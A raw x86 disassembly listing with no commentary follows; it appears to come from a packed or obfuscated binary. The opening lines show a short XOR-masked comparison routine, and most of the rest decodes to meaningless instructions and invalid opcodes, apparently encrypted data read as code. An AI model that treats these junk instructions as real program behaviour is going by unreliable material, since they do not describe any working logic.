  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    DWORD PTR [esi],0xfc
  405133:	rol    dl,cl
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xcd70707d
  40513e:	xor    DWORD PTR ds:0xcc295535,ebx
  405144:	mov    ebp,0x55f129d8
  405149:	dec    ebx
  40514a:	mov    cl,cl
  40514c:	mov    ebx,0x5747d26
  405151:	jne    0x405145
  405153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405154:	or     eax,0x8ff683f1
  405159:	mov    edx,0x45892c23
  40515e:	xor    DWORD PTR [eax-0x38883af4],0x32
  405165:	aas    
  405166:	cmp    al,0x63
  405168:	push   es
  405169:	sbb    eax,0x61d1d374
  40516e:	int    0xd3
  405170:	scas   eax,DWORD PTR es:[edi]
  405171:	add    DWORD PTR [esi-0x4eafeca4],esp
  405177:	frstor [ebx+0x7f]
  40517a:	test   eax,0x2ec79eb9
  40517f:	add    ebx,esp
  405181:	rol    BYTE PTR [edx-0x64],0x1f
  405185:	sub    eax,0xed74ca36
  40518a:	adc    BYTE PTR [ebp-0x2ea59c6b],0x86
  405191:	mov    esp,0xec02f47a
  405196:	inc    esi
  405197:	mov    bh,BYTE PTR [ebp-0x57]
  40519a:	sbb    BYTE PTR [ebx-0x71c5725e],bh
  4051a0:	outs   dx,DWORD PTR ds:[esi]
  4051a1:	add    bl,BYTE PTR [eax+esi*2-0x15a594c2]
  4051a8:	cli    
  4051a9:	out    0x8a,al
  4051ab:	sbb    BYTE PTR [ebx-0xb],ch
  4051ae:	mov    ds:0xc9dcab0a,al
  4051b3:	inc    ebx
  4051b4:	into   
  4051b5:	sub    al,0x7a
  4051b7:	fistp  DWORD PTR [edx]
  4051b9:	test   al,0xa4
  4051bb:	adc    DWORD PTR [eax],eax
  4051bd:	and    BYTE PTR [esi],ch
  4051bf:	fs inc edi
  4051c1:	(bad)
  4051c5:	fsubr  DWORD PTR [edi]
  4051c7:	pop    ebp
  4051c8:	jmp    0x12a5ff06
  4051cd:	sar    DWORD PTR [edi],cl
  4051cf:	jg     0x405198
  4051d1:	ds icebp 
  4051d3:	fdivr  QWORD PTR [eax*4-0x837f014]
  4051da:	inc    ebx
  4051db:	xchg   edi,esi
  4051dd:	xchg   edx,eax
  4051de:	cmp    eax,esp
  4051e0:	dec    esi
  4051e1:	push   0xab86131f
  4051e6:	and    esi,0xffffffb6
  4051e9:	(bad)  
  4051ec:	hlt    
  4051ed:	cmp    ecx,DWORD PTR cs:[ebp-0x4b9e769e]
  4051f4:	adc    eax,0xf69ac0e5
  4051f9:	lahf   
  4051fa:	xchg   ecx,eax
  4051fb:	add    eax,edi
  4051fd:	xor    bh,bh
  4051ff:	mov    bl,0x1e
  405201:	popa   
  405202:	mov    BYTE PTR cs:[ebx-0x5b5f3b73],ch
  405209:	pop    DWORD PTR [edx+0x592ce867]
  40520f:	loope  0x405248
  405211:	inc    ecx
  405212:	jmp    0xfc9e287c
  405217:	mov    edi,DWORD PTR [edi]
  405219:	jmp    0x405237
  40521b:	push   ecx
  40521c:	pop    esi
  40521d:	out    0x36,al
  40521f:	scas   eax,DWORD PTR es:[edi]
  405220:	xchg   ebx,eax
  405221:	jge    0x4051a8
  405223:	test   BYTE PTR [esi],0xfb
  405226:	push   eax
  405227:	pop    esp
  405228:	fwait
  405229:	xchg   edx,eax
  40522a:	mov    al,0x94
  40522c:	jae    0x405292
  40522e:	or     BYTE PTR [esi-0x3d02dc97],ah
  405234:	jmp    0x405232
  405236:	and    BYTE PTR [ebx-0x34],ch
  405239:	pop    ds
  40523a:	dec    edi
  40523b:	mov    esp,0x4c4b57e5
  405240:	jae    0x405243
  405242:	loope  0x405253
  405244:	dec    edx
  405245:	icebp  
  405246:	fadd   DWORD PTR [eax+0x76]
  405249:	aam    0xbf
  40524b:	mov    edi,0x290de536
  405250:	adc    al,0x44
  405252:	mov    ds:0xc3e8e9b9,al
  405257:	inc    DWORD PTR [ecx+ecx*1+0x6b9ff806]
  40525e:	mov    bl,0xd0
  405260:	dec    ecx
  405261:	or     DWORD PTR [eax-0x3d],esp
  405264:	or     al,ah
  405266:	adc    eax,0xf5c842fd
  40526b:	or     DWORD PTR [eax+0x1],ecx
  40526e:	ins    BYTE PTR es:[edi],dx
  40526f:	retf   0xc37a
  405272:	jmp    0x405287
  405274:	dec    edx
  405275:	ja     0x405282
  405277:	imul   eax,esp
  40527a:	push   edx
  40527b:	out    dx,al
  40527c:	cmc    
  40527d:	push   edi
  40527e:	cmp    BYTE PTR [ebx-0x63],ah
  405281:	xlat   BYTE PTR ds:[ebx]
  405282:	xchg   edi,eax
  405283:	mov    edi,0xc2d4d5b6
  405288:	imul   ah
  40528a:	jle    0x4052f3
  40528c:	es and al,0x7f
  40528f:	or     DWORD PTR [edi+edi*4],esp
  405292:	dec    edi
  405293:	cmp    al,0x93
  405295:	test   al,0x63
  405297:	(bad)  
  405298:	mul    DWORD PTR [ecx+0x30]
  40529b:	retf   
  40529c:	dec    ebx
  40529d:	xchg   esi,eax
  40529e:	sti    
  40529f:	mov    bl,0x40
  4052a1:	mov    al,0xc9
  4052a3:	jnp    0x85dd699d
  4052a9:	jl     0x4052e1
  4052ab:	fwait
  4052ac:	pop    ebx
  4052ad:	mov    ds:0x8160413,al
  4052b2:	retf   0xab47
  4052b5:	test   al,0xbe
  4052b7:	xchg   DWORD PTR [esi+ecx*4-0x58],ebx
  4052bb:	cdq    
  4052bc:	push   edx
  4052bd:	inc    ebx
  4052be:	cld    
  4052bf:	das    
  4052c0:	adc    eax,0x93693ed
  4052c5:	push   0xffffffc4
  4052c7:	mov    fs,WORD PTR [edi]
  4052c9:	hlt    
  4052ca:	mov    eax,0x2c24d8bb
  4052cf:	leave  
  4052d0:	inc    ecx
  4052d1:	push   ebx
  4052d2:	dec    eax
  4052d3:	inc    edi
  4052d4:	adc    eax,0x2bf76374
  4052d9:	je     0x4052bd
  4052db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052dc:	sbb    eax,0x407c0b27
  4052e1:	and    DWORD PTR [edi+eiz*4-0x74],ebp
  4052e5:	pop    ds
  4052e6:	les    esp,FWORD PTR [ebx]
  4052e8:	js     0x4052cb
  4052ea:	jmp    0xa59865cd
  4052ef:	pop    ss
  4052f0:	mov    bh,0xe2
  4052f2:	jns    0x40532d
  4052f4:	add    al,0x76
  4052f6:	scas   eax,DWORD PTR es:[edi]
  4052f7:	in     al,0xe6
  4052f9:	fistp  QWORD PTR [edx]
  4052fb:	shl    DWORD PTR [eax],0xd3
  4052fe:	push   ebx
  4052ff:	fnsave [edx]
  405301:	xor    ah,bl
  405303:	cdq    
  405304:	or     esi,ebx
  405306:	mov    dh,dh
  405308:	in     eax,0xf2
  40530a:	or     cl,bl
  40530c:	mov    ch,0xcb
  40530e:	jle    0x405371
  405310:	jmp    0x40538d
  405312:	call   0x289f:0xfbfabe7c
  405319:	repnz pop ecx
  40531b:	mov    dh,BYTE PTR [ebp+0x100d593a]
  405321:	mov    esp,0xe721db06
  405326:	pop    eax
  405327:	xchg   ebp,eax
  405328:	and    DWORD PTR [edx-0x8],0xffffffdd
  40532c:	ret    0x603e
  40532f:	addr16 jmp 0xffdeba3a
  405335:	int    0xc4
  405337:	push   ebx
  405338:	or     BYTE PTR [ebp+0x57],ah
  40533b:	inc    ecx
  40533c:	stos   BYTE PTR es:[edi],al
  40533d:	cli    
  40533e:	sti    
  40533f:	fstenv [ebp-0x53bf9361]
  405346:	cld    
  405347:	(bad)  
  405348:	(bad)  
  405349:	jns    0x40539e
  40534b:	sbb    ch,BYTE PTR [edi-0x14]
  40534e:	repz dec ebx
  405350:	jbe    0x405371
  405352:	xor    BYTE PTR [ebx],al
  405354:	in     eax,dx
  405355:	call   0xdfac5ba6
  40535a:	xor    ebp,DWORD PTR [edx+eax*8]
  40535d:	xor    dl,al
  40535f:	xchg   edx,eax
  405360:	ret    0xc102
  405363:	xor    DWORD PTR [esi+0x6224aedc],edx
  405369:	cmp    ch,0x2b
  40536c:	sbb    BYTE PTR [edx+eiz*4-0x2c],al
  405370:	out    0x59,al
  405372:	ds pop ebx
  405374:	rcr    BYTE PTR [ebx],0x31
  405377:	xchg   ebx,eax
  405378:	inc    edx
  405379:	push   esi
  40537a:	stc    
  40537b:	xor    dh,BYTE PTR [ecx]
  40537d:	mov    DWORD PTR [esi+0x11],ecx
  405380:	ds or  al,0xb7
  405383:	cmp    eax,0x89171642
  405388:	and    al,0x55
  40538a:	inc    edx
  40538b:	push   ss
  40538c:	stos   BYTE PTR es:[edi],al
  40538d:	add    eax,0x19882c35
  405392:	pusha  
  405393:	dec    ebx
  405394:	or     dh,dl
  405396:	pop    edi
  405397:	cli    
  405398:	out    dx,eax
  405399:	sbb    esi,edi
  40539b:	add    eax,0xe06858b8
  4053a0:	aas    
  4053a1:	das    
  4053a2:	shl    DWORD PTR [ecx-0x69698584],0x5c
  4053a9:	call   0x6b96:0x4be75e0e
  4053b0:	cld    
  4053b1:	sbb    DWORD PTR [edi-0x5845a755],eax
  4053b7:	ins    DWORD PTR es:[edi],dx
  4053b8:	lahf   
  4053b9:	xor    bh,al
  4053bb:	jnp    0x4053f5
  4053bd:	test   edi,esi
  4053bf:	push   cs
  4053c0:	int    0x1
  4053c2:	es repnz mov ebx,ebp
  4053c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c7:	jbe    0x4053ce
  4053c9:	inc    edi
  4053ca:	xchg   ebp,eax
  4053cb:	(bad)  
  4053cc:	leave  
  4053cd:	fwait
  4053ce:	shl    DWORD PTR [esi+edx*8+0x19],0x84
  4053d3:	mov    bh,0xa5
  4053d5:	loope  0x405363
  4053d7:	sbb    BYTE PTR [edi],dh
  4053d9:	jl     0x4053fe
  4053db:	mov    edx,0xc9172520
  4053e0:	or     esi,DWORD PTR [ebp-0x2e]
  4053e3:	sub    ch,al
  4053e5:	add    al,0x51
  4053e7:	int3   
  4053e8:	mov    edi,0xde050be3
  4053ed:	(bad)  
  4053ee:	fisttp DWORD PTR [ecx-0x21603590]
  4053f4:	cmp    edi,DWORD PTR [ecx+0x78]
  4053f7:	mov    ?,WORD PTR [esi+ebp*4-0x746739ec]
  4053fe:	xchg   cl,ah
  405400:	ins    DWORD PTR es:[edi],dx
  405401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405402:	(bad)  [eax+0x128f43b4]
  405408:	jb     0x405488
  40540a:	add    esp,ebp
  40540c:	call   0xe3990a05
  405411:	popf   
  405412:	pop    ds
  405413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405414:	ret    0x3faf
  405417:	outs   dx,DWORD PTR ds:[esi]
  405418:	cld    
  405419:	push   ebx
  40541a:	dec    ecx
  40541b:	lods   al,BYTE PTR ds:[esi]
  40541c:	loopne 0x405433
  40541e:	inc    esi
  40541f:	ret    
  405420:	sbb    eax,0x9963299d
  405425:	daa    
  405426:	arpl   WORD PTR [ecx],bp
  405428:	cmp    al,0x5e
  40542a:	loope  0x40546b
  40542c:	xor    cl,BYTE PTR [eax+0x239a9931]
  405432:	mov    edx,gs
  405434:	xchg   ecx,eax
  405435:	jnp    0x40548f
  405437:	int    0x6d
  405439:	cld    
  40543a:	(bad)  
  40543c:	out    0xbc,al
  40543e:	iret   
  40543f:	call   0x4c78568d
  405444:	pop    ecx
  405445:	lods   al,BYTE PTR ds:[esi]
  405446:	rol    DWORD PTR [edi+ecx*8],0x21
  40544a:	add    edi,DWORD PTR [ebx-0x1b]
  40544d:	sub    esi,ebp
  40544f:	outs   dx,BYTE PTR ds:[esi]
  405450:	xlat   BYTE PTR ds:[ebx]
  405451:	outs   dx,DWORD PTR ds:[esi]
  405452:	gs sub al,0xa9
  405455:	xor    DWORD PTR [edi-0x71],eax
  405458:	inc    ebx
  405459:	xchg   BYTE PTR [edi],bh
  40545b:	jo     0x4054a9
  40545d:	xchg   ebp,eax
  40545e:	push   ebp
  40545f:	inc    ecx
  405460:	fnstcw WORD PTR [ecx+0x349ad9d6]
  405466:	mov    ebp,0x34004aaa
  40546b:	pop    es
  40546c:	jo     0x4054d4
  40546e:	push   esp
  40546f:	(bad)  
  405470:	cmc    
  405471:	(bad)  
  405472:	call   0x41b61d74
  405477:	out    0x10,al
  405479:	and    eax,0xf70937e6
  40547e:	xor    BYTE PTR [eax],cl
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e884
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e7eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	imul   eax,edi,0xffffff99
  4054ab:	add    DWORD PTR [eax],edx
  4054ad:	aaa    
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054cf
  4054b5:	xchg   DWORD PTR [ebp-0x2e],esp
  4054b8:	test   al,0xe7
  4054ba:	call   0x1ce31f3a
  4054bf:	cmp    esi,DWORD PTR [eax+0x76]
  4054c2:	shl    dh,cl
  4054c4:	idiv   DWORD PTR [ebx-0x1f]
  4054c7:	shl    ah,0x62
  4054ca:	cdq    
  4054cb:	adc    ecx,DWORD PTR [ebp+0x11]
  4054ce:	and    al,0xc1
  4054d0:	rcl    DWORD PTR [ecx-0x6499d576],0xef
  4054d7:	xor    DWORD PTR [edx+eax*2+0x1e827e6a],esp
  4054de:	adc    DWORD PTR [eax+0x3d],esp
  4054e1:	mov    dl,0xd1
  4054e3:	jb     0x40548d
  4054e5:	sahf   
  4054e6:	sub    BYTE PTR [ecx],al
  4054e8:	lea    esi,[edi]
  4054ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054eb:	and    al,0x95
  4054ed:	arpl   WORD PTR [ebx],di
  4054ef:	add    al,0x61
  4054f1:	push   esi
  4054f2:	(bad)  
  4054f3:	mov    ecx,DWORD PTR [ecx]
  4054f5:	pop    ds
  4054f6:	or     cl,BYTE PTR [edi+0x2ccacb57]
  4054fc:	or     al,0xb
  4054fe:	in     al,dx
  4054ff:	mov    edx,DWORD PTR [ebp+0x42]
  405502:	and    DWORD PTR [ebx-0x7176456f],esi
  405508:	jmp    0x471b:0x6c2f53d
  40550f:	pop    edi
  405510:	sub    edx,DWORD PTR [eax-0x148619cb]
  405516:	fcomi  st,st(4)
  405518:	aam    0xed
  40551a:	sti    
  40551b:	loopne 0x405529
  40551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551e:	in     eax,dx
  40551f:	mov    esp,0xd5aa37c9
  405524:	ins    BYTE PTR es:[edi],dx
  405525:	inc    eax
  405526:	aad    0x93
  405528:	test   DWORD PTR [eax+0x47],ebx
  40552b:	mov    bl,0x2
  40552d:	xor    edx,DWORD PTR [esi-0x63851dd9]
  405533:	adc    al,0xc7
  405535:	daa    
  405536:	(bad)  
  405537:	jmp    0x4054d6
  405539:	adc    bh,BYTE PTR [ebx-0x66631945]
  40553f:	cli    
  405540:	sub    BYTE PTR [ebp-0x616bf6e5],0xe0
  405547:	(bad)  
  405548:	aam    0x66
  40554a:	loopne 0x405526
  40554c:	push   ebx
  40554d:	jp     0x4054d9
  40554f:	fs aas 
  405551:	mov    eax,0xf0eda9cb
  405556:	in     eax,dx
  405557:	xchg   edx,eax
  405558:	pop    es
  405559:	xchg   BYTE PTR [edi+0x70],al
  40555c:	rcr    BYTE PTR [eax+0x6f71288d],0x65
  405563:	and    ebp,DWORD PTR [esi]
  405565:	stos   BYTE PTR es:[edi],al
  405566:	(bad)  [ebp-0x7c]
  405569:	call   DWORD PTR [edx-0xc6e1450]
  40556f:	das    
  405570:	pushf  
  405571:	dec    eax
  405572:	out    dx,al
  405573:	jge    0x405573
  405575:	(bad)  
  405576:	adc    DWORD PTR [edi],ebx
  405578:	ror    DWORD PTR [ebp+0xdec3f],cl
  40557e:	sub    bh,BYTE PTR [ebp+eax*8-0x73]
  405582:	pop    es
  405583:	pop    edi
  405584:	mov    esp,?
  405586:	rcl    DWORD PTR [esi],0xd4
  405589:	int    0xde
  40558b:	repz (bad) 
  40558e:	mov    cl,0xc5
  405590:	mov    ds:0x861f68b3,eax
  405595:	in     eax,0x5c
  405597:	pop    esi
  405598:	mov    edx,0xab86e3f
  40559d:	sub    al,0xaa
  40559f:	pop    esp
  4055a0:	jae    0x405602
  4055a2:	sbb    eax,0xdd85dec2
  4055a7:	fidivr WORD PTR [ebp+0x51]
  4055aa:	pop    esp
  4055ab:	jmp    FWORD PTR [ebx+ebp*2+0xc]
  4055af:	loope  0x40559c
  4055b1:	lods   eax,DWORD PTR ds:[esi]
  4055b2:	fistp  QWORD PTR [ebx]
  4055b4:	sahf   
  4055b5:	adc    eax,0x30c56292
  4055ba:	pop    es
  4055bb:	sub    al,BYTE PTR [ebp+0x62e55af7]
  4055c1:	mov    edx,DWORD PTR [ebp-0x11]
  4055c4:	outs   dx,BYTE PTR ds:[esi]
  4055c5:	sbb    BYTE PTR [edx+edi*2-0x6bfb5872],dh
  4055cc:	not    dl
  4055ce:	retf   
  4055cf:	mov    bl,0xe6
  4055d1:	ja     0x4055b3
  4055d3:	pop    edx
  4055d4:	loopne 0x4055b1
  4055d6:	aam    0xf6
  4055d8:	mov    ebp,0xebafcd27
  4055dd:	mov    ah,BYTE PTR ds:0x8664b17b
  4055e3:	pop    eax
  4055e4:	mov    edx,0x7876bd05
  4055e9:	adc    bl,bl
  4055eb:	cld    
  4055ec:	rol    bl,0x6d
  4055ef:	push   ebp
  4055f0:	in     al,0x44
  4055f2:	dec    edx
  4055f3:	leave  
  4055f4:	or     ebp,DWORD PTR [eax]
  4055f6:	mov    cl,0xaa
  4055f8:	mov    ch,0xcf
  4055fa:	xor    DWORD PTR [ebx+0x30a14edd],esp
  405600:	add    al,0x62
  405602:	sbb    BYTE PTR [ecx-0x509979],0xd3
  405609:	test   DWORD PTR [edi+edx*4-0x3e],esp
  40560d:	cmp    DWORD PTR [esi],ecx
  40560f:	scas   al,BYTE PTR es:[edi]
  405610:	pop    ecx
  405611:	ins    BYTE PTR es:[edi],dx
  405612:	fisttp DWORD PTR [ecx]
  405614:	xor    ch,cl
  405616:	add    al,0xe3
  405618:	mov    dh,0xc1
  40561a:	daa    
  40561b:	mov    WORD PTR [ecx+0x74],gs
  40561e:	push   edi
  40561f:	stos   BYTE PTR es:[edi],al
  405620:	jnp    0x4055e4
  405622:	test   DWORD PTR [ecx-0x5a],esi
  405625:	or     DWORD PTR [edx-0x1431a8c],esi
  40562b:	jno    0x405683
  40562d:	pop    es
  40562e:	and    al,0xb5
  405630:	push   esp
  405631:	dec    eax
  405632:	pop    ebp
  405633:	adc    BYTE PTR [ebx-0x73e9dac1],ah
  405639:	ror    DWORD PTR fs:[eax+esi*8+0x1b],1
  40563e:	sbb    eax,0x436f6377
  405643:	inc    edi
  405644:	pop    ds
  405645:	adc    DWORD PTR [esi+ebp*8+0x1278762c],esp
  40564c:	loop   0x4056ad
  40564e:	mov    BYTE PTR [edx+0x6],bl
  405651:	mov    BYTE PTR [ebx+0x32],dl
  405654:	das    
  405655:	in     al,dx
  405656:	and    ah,BYTE PTR [ebx-0x26]
  405659:	int    0xea
  40565b:	cdq    
  40565c:	push   0xffffffe4
  40565e:	xchg   ebx,eax
  40565f:	mov    bl,0x70
  405661:	adc    esp,ecx
  405663:	sub    ah,ah
  405665:	cdq    
  405666:	cmp    DWORD PTR [ecx-0x6d],edx
  405669:	xor    dl,BYTE PTR [ecx]
  40566b:	inc    ebx
  40566c:	xor    DWORD PTR [ebp-0x62],edi
  40566f:	mov    al,0x3e
  405671:	jb     0x405658
  405673:	icebp  
  405674:	fidivr WORD PTR [ecx+0x32]
  405677:	repz xor DWORD PTR [ebx],0xfffffff0
  40567b:	test   BYTE PTR [ebx],al
  40567d:	imul   esi,DWORD PTR [esi],0x530d01cd
  405683:	(bad)  
  405684:	and    ebp,DWORD PTR [edi-0x1efe6d0d]
  40568a:	int3   
  40568b:	push   esi
  40568c:	sbb    DWORD PTR [edi+0x2],esi
  40568f:	xlat   BYTE PTR ds:[ebx]
  405690:	(bad)  
  405691:	bound  ebp,QWORD PTR [edx]
  405693:	cmp    BYTE PTR [ebp+ebp*8+0x47732e92],dl
  40569a:	daa    
  40569b:	(bad)  [esi+0x0]
  40569e:	cmp    DWORD PTR [edx-0x31],eax
  4056a1:	int    0x4d
  4056a3:	dec    eax
  4056a4:	fimul  WORD PTR [ebx+0x40]
  4056a7:	icebp  
  4056a8:	sub    eax,0x5bfc143
  4056ad:	add    BYTE PTR [ecx-0x1b5cbbcc],cl
  4056b3:	int    0xe3
  4056b5:	leave  
  4056b6:	or     DWORD PTR [esi+0x61],ecx
  4056b9:	popa   
  4056ba:	fstp   TBYTE PTR [ebp-0x4d]
  4056bd:	xchg   ebx,eax
  4056be:	bound  ebx,QWORD PTR [ebx+0x4d]
  4056c1:	cmp    BYTE PTR [edx+0xb],0xc5
  4056c5:	jo     0x40571d
  4056c7:	xor    eax,DWORD PTR [esi]
  4056c9:	and    eax,0xedd1d382
  4056ce:	mov    dh,0x80
  4056d0:	mov    bh,0xc5
  4056d2:	sub    ch,ch
  4056d4:	pushf  
  4056d5:	inc    edx
  4056d6:	out    dx,eax
  4056d7:	jns    0x4056c4
  4056d9:	ret    0xa293
  4056dc:	cwde   
  4056dd:	fucomi st,st(4)
  4056df:	ins    BYTE PTR es:[edi],dx
  4056e0:	(bad)  
  4056e1:	mov    bl,0xe2
  4056e3:	mov    ebp,0xb316be8c
  4056e8:	popa   
  4056e9:	inc    ebp
  4056ea:	stos   DWORD PTR es:[edi],eax
  4056eb:	jg     0x40576a
  4056ed:	pop    ebx
  4056ee:	pop    edi
  4056ef:	inc    ebx
  4056f0:	jmp    DWORD PTR [ebx-0x78]
  4056f3:	pop    edx
  4056f4:	mov    eax,0x5269e1a5
  4056f9:	pop    esp
  4056fa:	push   ebp
  4056fb:	xchg   ebp,eax
  4056fc:	rcl    DWORD PTR [edx],0xa9
  4056ff:	ds (bad) 
  405701:	scas   eax,DWORD PTR es:[edi]
  405702:	stos   DWORD PTR es:[edi],eax
  405703:	lods   al,BYTE PTR ds:[esi]
  405704:	fild   WORD PTR [esi]
  405706:	ss adc al,0x7e
  405709:	arpl   di,si
  40570b:	test   BYTE PTR [ebx],cl
  40570d:	popf   
  40570e:	xchg   esi,eax
  40570f:	and    al,0x3e
  405711:	sbb    BYTE PTR [eax+0x554d994e],0xb1
  405718:	add    DWORD PTR [edx],0xffffffa3
  40571b:	add    BYTE PTR [ecx-0x41ef1042],0xae
  405722:	add    BYTE PTR [esi+0x1cf28d9e],0x55
  405729:	mov    fs,edi
  40572b:	mov    ecx,0xe215f7af
  405730:	mov    ah,0xf6
  405732:	stc    
  405733:	inc    edx
  405734:	mov    ch,0x94
  405736:	ffree  st(0)
  405738:	fnstsw WORD PTR [ecx+0x5]
  40573b:	or     BYTE PTR [eax-0x6b],0x4c
  40573f:	arpl   WORD PTR [ebx],cx
  405741:	fwait
  405742:	or     ch,BYTE PTR [edi]
  405744:	lahf   
  405745:	and    eax,0xae4280e
  40574a:	shl    edi,0x8e
  40574d:	pop    ecx
  40574e:	or     dl,bl
  405750:	imul   ecx,DWORD PTR [edx-0x75],0x389da793
  405757:	ret    
  405758:	stc    
  405759:	dec    ebx
  40575a:	mov    bh,0x9d
  40575c:	jae    0x405717
  40575e:	aas    
  40575f:	iret   
  405760:	sbb    cl,BYTE PTR [ebx]
  405762:	in     al,0xa9
  405764:	mov    bh,0xa
  405766:	hlt    
  405767:	sub    al,BYTE PTR [ebx-0x48f0ae7e]
  40576d:	add    eax,0x42fe86
  405772:	and    eax,DWORD PTR ds:0x42fe7a
  405778:	mov    ds:0x42fe86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x758691be],eax
  405790:	push   cs
  405791:	cmp    eax,0x7070354a
  405796:	stos   BYTE PTR es:[edi],al
  405797:	jle    0x405809
  405799:	jo     0x4057f0
  40579b:	shl    DWORD PTR [ebp-0x25bce9b3],0xca
  4057a2:	retf   0xa60f
  4057a5:	sbb    BYTE PTR [ebx-0x5a],cl
  4057a8:	repnz imul ebp,DWORD PTR [ebp-0x55],0xfffffffc
  4057ad:	pop    edi
  4057ae:	sub    BYTE PTR ss:[ecx-0x66c8005b],bl
  4057b5:	lods   eax,DWORD PTR ds:[esi]
  4057b6:	addr16 jne 0x405757
  4057b9:	inc    ecx
  4057ba:	adc    eax,0x9da5fa15
  4057bf:	mov    ecx,0x9af8f3fb
  4057c4:	call   0x7744:0x51ea1740
  4057cb:	sub    al,0xc5
  4057cd:	mov    eax,0x26145245
  4057d2:	push   0xce8a1a4e
  4057d7:	or     al,BYTE PTR [eax-0x15b2db5c]
  4057dd:	jge    0x4057c3
  4057df:	into   
  4057e0:	xchg   esi,eax
  4057e1:	jg     0x405807
  4057e3:	sub    eax,0x6d46d627
  4057e8:	lock pop es
  4057ea:	jnp    0x4057a9
  4057ec:	fsub   DWORD PTR [edx-0x10]
  4057ef:	inc    ecx
  4057f0:	popa   
  4057f1:	scas   al,BYTE PTR es:[edi]
  4057f2:	xor    DWORD PTR [ebx+0x2fc3cd86],edi
  4057f8:	cmp    cl,BYTE PTR [eax-0x1f]
  4057fb:	mov    eax,0x89138be9
  405800:	push   esi
  405801:	xchg   ecx,eax
  405802:	xchg   BYTE PTR [ebp+edx*1+0x13444d5f],bh
  405809:	loopne 0x4057c0
  40580b:	mov    bl,0x6b
  40580d:	add    eax,0x7e7305ac
  405812:	push   cs
  405813:	pushf  
  405814:	xor    ebx,DWORD PTR [eax+ecx*1]
  405817:	push   eax
  405818:	(bad)  
  405819:	xor    al,0xc
  40581b:	mov    dl,0xc9
  40581d:	mov    esp,esp
  40581f:	adc    al,0x45
  405821:	sub    dl,BYTE PTR [ecx+0x101bdd3e]
  405827:	mov    ebp,0xded32528
  40582c:	loop   0x4057fc
  40582e:	das    
  40582f:	pop    ebx
  405830:	scas   eax,DWORD PTR es:[edi]
  405831:	mov    ebp,0xd2f153f8
  405836:	push   ebp
  405837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405838:	dec    esi
  405839:	sti    
  40583a:	or     eax,0x6a086f1a
  40583f:	mov    esi,ebx
  405841:	jmp    0x92ae:0xe87de18e
  405848:	ss pop edi
  40584a:	jnp    0x4057da
  40584c:	xchg   ecx,eax
  40584d:	ret    0x41da
  405850:	mov    WORD PTR [ecx+0x268640ed],es
  405856:	cmp    ebx,edx
  405858:	add    eax,0x8acf4e78
  40585d:	rol    BYTE PTR [eax+0x5e],1
  405860:	call   0xe345c839
  405865:	int3   
  405866:	lods   eax,DWORD PTR ds:[esi]
  405867:	jno    0x40583e
  405869:	xchg   esi,eax
  40586a:	push   edx
  40586b:	push   es
  40586c:	sub    DWORD PTR [eax-0x2],esp
  40586f:	cmp    al,0x6f
  405871:	sub    eax,0x9f2c1ee6
  405876:	cmp    al,0x24
  405878:	sbb    cl,BYTE PTR [eax+0x75fa99f5]
  40587e:	pop    edi
  40587f:	call   0x742c:0x538355b1
  405886:	outs   dx,DWORD PTR ds:[esi]
  405887:	add    DWORD PTR [edx-0x536540d3],0xffffffe4
  40588e:	(bad)  
  40588f:	jmp    0x5a4fd0bb
  405894:	inc    edi
  405895:	adc    cl,dl
